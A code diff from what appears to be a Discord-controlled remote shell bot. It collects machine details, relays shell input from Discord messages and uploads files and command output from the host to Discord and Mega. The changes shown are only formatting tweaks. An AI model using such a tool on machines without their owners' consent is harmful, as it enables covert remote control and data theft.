@@ -130,7 +130,7 @@ async def machine_info():
         machine_UUID = str("Unknown")
 
     embedded = discord.Embed(title="Machine Info", type="rich")
-    embedded.add_field(name="Operating System", value=system())
+    embedded.add_field(name="Operating System", value=platform.system())
     embedded.add_field(name="UUID", value=machine_UUID)
 
     # Non-embed alternative
@@ -146,7 +146,7 @@ async def on_message(message):
 
 # Helper function for upload, uploads given file name to Mega
 async def mega_upload(filename):
-    await channel.send(f"Uploading {filename} to Mega, standby...")
+    await channel.send(f"Uploading `{filename}` to Mega, standby...")
     
     mega_upload = mega_nz.upload(filename)
     mega_link = mega_nz.get_upload_link(mega_upload)
@@ -167,8 +167,8 @@ async def upload_chunks(filename):
         while chunk:
             uploadname = f"{filename}-{i}"
 
-            await channel.send(f"Uploading part {i} of the file as "
-                               f"{uploadname}, standby...")
+            await channel.send(f"Uploading part `{i}` of the file as "
+                               f"`{uploadname}`, standby...")
             await channel.send(file=discord.File(io.BytesIO(chunk),
                                                  filename=uploadname))
 
@@ -194,7 +194,7 @@ async def upload(filename):
     
     else:
         if filesize <= FILE_SIZE_MAX:
-            await channel.send(f"Uploading {filename}, standby...")
+            await channel.send(f"Uploading `{filename}`, standby...")
             await channel.send(file=discord.File(filename))
         
         # If filesize is bigger then 7.5 MB, and less then or equal to 
@@ -218,8 +218,8 @@ async def upload_chunks_from_memory(data):
     for chunk in data:
         uploadname = f"output-{i}.txt"
 
-        await channel.send(f"Uploading part {i} of the output as "
-                           f"{uploadname}, standby")
+        await channel.send(f"Uploading part `{i}` of the output as "
+                           f"`{uploadname}`, standby")
         await channel.send(file=discord.File(io.BytesIO(chunk),
                                              filename=uploadname))
 
@@ -228,7 +228,7 @@ async def upload_from_memory(data, n):
 
         filename = "output.txt"
         await channel.send("Output is too large. As a result, "
-                           f"your output will be sent as {filename}")
+                           f"your output will be sent as `{filename}`")
         await channel.send(file=discord.File(io.BytesIO(data),
                                              filename=filename))
     
@@ -318,7 +318,7 @@ async def shell_input(message):
         await handle_user_input(message.content)
 
 
-if system() == "Windows":
+if platform.system() == "Windows":
     import ctypes
     import pywintypes
     import win32process
